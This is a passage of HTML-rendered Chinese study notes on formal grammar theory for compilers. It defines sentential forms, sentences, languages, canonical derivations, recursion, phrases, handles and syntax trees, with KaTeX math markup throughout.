style=\"height:0.688696em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>时，称符号串<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span></span></span></span>为文法的<strong>句型</strong>。</p>\n<h4 id=\"句子\"><a class=\"markdownIt-Anchor\" href=\"#句子\"></a> 句子</h4>\n<p>设有文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mrow><mo fence=\"true\">[</mo><mi>S</mi><mo fence=\"true\">]</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G\\left[S\\right]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">]</span></span></span></span></span>，若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">S \\stackrel{*}{\\Rightarrow}x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span></span></span></span>，且<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi><mo>∈</mo><msubsup><mi>V</mi><mi>T</mi><mo>∗</mo></msubsup></mrow><annotation encoding=\"application/x-tex\">x \\in  V_{T}^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.964027em;vertical-align:-0.275331em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-2.424669em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.275331em;\"><span></span></span></span></span></span></span></span></span></span>时，称符号串<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span></span></span></span>为文法的<strong>句子</strong>。</p>\n<h4 id=\"语言-2\"><a class=\"markdownIt-Anchor\" href=\"#语言-2\"></a> 语言</h4>\n<p>文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mrow><mo fence=\"true\">[</mo><mi>S</mi><mo fence=\"true\">]</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G\\left[S\\right]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">]</span></span></span></span></span>所产生的所有<strong>句子</strong>的集合称为文法定义的<strong>语言</strong>，记为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><mi>G</mi><mrow><mo fence=\"true\">[</mo><mi>S</mi><mo fence=\"true\">]</mo></mrow><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(G\\left[S\\right]\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">]</span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span></p>\n<ol>\n<li>文法给定后，语言就确定了。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><mi>G</mi><mrow><mo fence=\"true\">[</mo><mi>S</mi><mo fence=\"true\">]</mo></mrow><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(G\\left[S\\right]\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">]</span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msubsup><mi>V</mi><mi>T</mi><mo>∗</mo></msubsup></mrow><annotation encoding=\"application/x-tex\">V_{T}^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.964027em;vertical-align:-0.275331em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-2.424669em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.275331em;\"><span></span></span></span></span></span></span></span></span></span>的<strong>子集</strong>。</li>\n</ol>\n<h3 id=\"规范推导和规范规约\"><a class=\"markdownIt-Anchor\" href=\"#规范推导和规范规约\"></a> 规范推导和规范规约</h3>\n<p>很明显，同一个句子、句型是可以通过不同的推导序列推导出的，因为可以选择不同的nonterminal次序。</p>\n<p>最左（最右）推导：推导序列中每一步直接推导都是对左部中最左（最右）的nonterminal进行替换。</p>\n<p>最右推导也叫<strong>规范推导</strong>，用规范推导推导出的句型称为<strong>规范句型</strong>。</p>\n<p>规范推导的逆过程，被称为<strong>最左规约</strong>，也叫做<strong>规范规约</strong>。</p>\n<h3 id=\"规则递归\"><a class=\"markdownIt-Anchor\" href=\"#规则递归\"></a> 规则递归</h3>\n<p>在规则的左部和右部具有相同的nonterminal时，称为递归规则。</p>\n<ul>\n<li>若有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>A</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow A...</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span></span></span></span>，称为规则左递归。</li>\n<li>若有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow ...A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord mathdefault\">A</span></span></span></span>，称为规则右递归。</li>\n<li>若有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi>A</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow ...A...</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span></span></span></span>，称为规则递归。</li>\n</ul>\n<h3 id=\"文法递归\"><a class=\"markdownIt-Anchor\" href=\"#文法递归\"></a> 文法递归</h3>\n<p>对于文法，若存在一个nonterminal和一个推导，和规则递归相似时，称为文法递归。</p>\n<ul>\n<li>若有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>⇒</mo><mi>A</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">A\\Rightarrow A...</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span></span></span></span>，称为文法左递归。</li>\n<li>若有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>⇒</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A\\Rightarrow ...A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord mathdefault\">A</span></span></span></span>，称为文法右递归。</li>\n<li>若有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>⇒</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi>A</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">A\\Rightarrow ...A...</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span></span></span></span>，称为文法递归。</li>\n</ul>\n<h3 id=\"短语-直接短语\"><a class=\"markdownIt-Anchor\" href=\"#短语-直接短语\"></a> 短语、直接短语</h3>\n<p>令<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>是一个文法，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">S</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span></span>是文法的开始符号，而<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>β</mi><mi>σ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\beta \\sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">σ</span></span></span></span>是其一个句型。如果有：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>α</mi><mi>β</mi><mi>σ</mi><mi mathvariant=\"normal\">且</mi><mi>A</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">S \\stackrel{*}{\\Rightarrow}\\alpha \\beta \\sigma且A\\stackrel{+}{\\Rightarrow} \\beta\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.269641em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span></span></p>\n<p>则称：<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>是**相对于nonterminal <span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span><strong>的</strong>句型<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>β</mi><mi>σ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\beta \\sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">σ</span></span></span></span>**的短语。</p>\n<p>特别地，如果<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>α</mi><mi>β</mi><mi>σ</mi><mi mathvariant=\"normal\">且</mi><mi>A</mi><mo>⇒</mo><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">S \\stackrel{*}{\\Rightarrow}\\alpha \\beta \\sigma且A\\Rightarrow \\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>，则称为<strong>直接短语</strong>。</p>\n<h3 id=\"句柄\"><a class=\"markdownIt-Anchor\" href=\"#句柄\"></a> 句柄</h3>\n<p>一个句型的<strong>最左直接短语</strong>称为该句型的<strong>句柄</strong>。</p>\n<ol>\n<li>句柄是直接短语，由于推导左部是nonterminal，所以句柄不仅在直接推导右部，也在一则规则右部。</li>\n<li>最左。</li>\n</ol>\n<h3 id=\"语法树\"><a class=\"markdownIt-Anchor\" href=\"#语法树\"></a> 语法树</h3>\n<h4 id=\"语法树的生成\"><a class=\"markdownIt-Anchor\" href=\"#语法树的生成\"></a> 语法树的生成</h4>\n<p>语法树是句型的推导过程的一种<strong>图形表示</strong>。设存在文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator=\"true\">,</mo><msub><mi>V</mi><mi>T</mi></msub><mo separator=\"true\">,</mo><mi>P</mi><mo separator=\"true\">,</mo><mi>S</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G=\\left(V_{N},V_{T},P,S\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>，对其任何句型都能构造满足下列要求的语法树。</p>\n<ol>\n<li>每个结点都有一个标记，标记是$ V_{N}\\cup V_{T}\\cup\\left{\\epsilon\\right} $中的一个符号。</li>\n<li>root结点的标记是开始符号<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">S</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span></span>。</li>\n<li>若某一个结点至少有一个子结点，则其标记一定是<strong>nonterminal</strong>。</li>\n<li>若某个结点<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.03148em;\">k</span></span></span></span>个子结点，其标记分别为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>A</mi><mi>k</mi></msub></mrow><annotation encoding=\"application/x-tex\">A_{1},...,A_{k}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" 